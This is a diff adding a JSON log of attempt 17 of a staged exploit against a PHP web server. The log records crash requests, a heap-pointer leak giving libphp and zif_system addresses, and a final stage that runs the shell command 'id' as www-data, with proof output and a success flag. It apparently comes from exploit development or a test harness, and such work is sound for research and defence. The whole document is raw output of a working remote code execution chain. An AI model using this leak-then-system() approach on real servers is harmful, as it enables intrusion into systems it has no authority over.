@@ -1,0 +1,179 @@
+{
+ "attempt": 17,
+ "started": "2026-10-22T13:39:57Z",
+ "stages": [
+  {
+   "stage": "A1",
+   "chain_try": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "869d8f09d5d02f9a1b8cd3c91f45a36b1bb487c11366dfef1f4c75484975a4f3",
+   "elapsed_s": 0.13
+  },
+  {
+   "stage": "B1",
+   "chain_try": 0,
+   "i": 0,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.141,
+   "leak": "miss",
+   "miss_reason": "RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "chain_try": 0,
+   "i": 1,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.102,
+   "leak": "miss",
+   "miss_reason": "RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "chain_try": 0,
+   "i": 2,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.088,
+   "leak": "miss",
+   "miss_reason": "RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "chain_try": 0,
+   "i": 3,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.108,
+   "leak": "miss",
+   "miss_reason": "RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "chain_try": 0,
+   "i": 4,
+   "bytes": 1661663,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.085,
+   "decoded": 819208,
+   "zdtor": "0x7f70a50d8b60",
+   "libphp": "0x7f70a4a7a000",
+   "buckets": [
+    [
+     "0x7f70a2600000",
+     7495
+    ],
+    [
+     "0x7f70a5000000",
+     1095
+    ],
+    [
+     "0x7f70a2e00000",
+     87
+    ],
+    [
+     "0x7f70a2400000",
+     79
+    ]
+   ],
+   "main": "0x7f70a2e00000",
+   "cand_counts": {
+    "0x7f70a2e00000": 87,
+    "0x7f70a2400000": 79
+   },
+   "leak": "hit"
+  },
+  {
+   "stage": "A2",
+   "i": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "f43b735792ae5d545f0e1f2b0e4bba11ff63911a774f119e7aec4a744c39e013",
+   "elapsed_s": 0.109
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 259,
+   "sha256": "bc441266922d7307b776ef989182255fde08fab5206a21b12a4092c4def4beec",
+   "elapsed_s": 0.012
+  },
+  {
+   "stage": "B2",
+   "i": 1,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 259,
+   "sha256": "e1a646c02917d13f72f46df0e7d969ac3102ea32f77528e957d24281564ec6bb",
+   "elapsed_s": 0.005
+  },
+  {
+   "stage": "B2",
+   "i": 2,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 259,
+   "sha256": "39a2b36854419aa32f99107c80202b1d09b3e904e94a07419651fad4e9512787",
+   "elapsed_s": 0.008
+  },
+  {
+   "stage": "B2",
+   "i": 3,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 259,
+   "sha256": "3b46ba3e514fe8c6d6b813e7054e9e1e25a78e75700d1e28f0ed331eddeb1444",
+   "elapsed_s": 0.005
+  },
+  {
+   "stage": "B2",
+   "i": 4,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 259,
+   "sha256": "9fa56533515a9053c282a553ed50714e8a769c14b6fbb6d1ac842b7ba66388f9",
+   "elapsed_s": 0.01
+  },
+  {
+   "stage": "B2",
+   "i": 5,
+   "status": "",
+   "bytes": 0,
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "elapsed_s": 0.018,
+   "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n9BIE_MW_20261022T130520Z_A17_b5\n"
+  }
+ ],
+ "success": true,
+ "marker": "9BIE_MW_20261022T130520Z_A17",
+ "bodies": {
+  "a1": {
+   "bytes": 1060211,
+   "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+  },
+  "b1": {
+   "bytes": 33128677,
+   "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+  },
+  "a2": {
+   "bytes": 279369,
+   "sha256": "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"
+  },
+  "b2_first": {
+   "bytes": 451384,
+   "sha256": "eb34964883121adfcf08489f873500b07754d18237dcabc75e6bbcf206b48c2c"
+  }
+ },
+ "S": "0x7f70a2ef8398",
+ "zif_system": "0x7f70a4edf370",
+ "b1_chain_try": 0,
+ "b1_hit_attempt": 4,
+ "route": "single",
+ "b2_cmd": "id>/out/p1_a17;echo 9BIE_MW_20261022T130520Z_A17_b0>>/out/p1_a17;id>&2;echo 9BIE_MW_20261022T130520Z_A17_b0>&2",
+ "b2_hit_attempt": 5,
+ "post_health": {
+  "status": "HTTP/1.1 200 OK",
+  "bytes": 195,
+  "body": "OK\n"
+ },
+ "finished": "2026-10-22T13:40:06Z"
+}
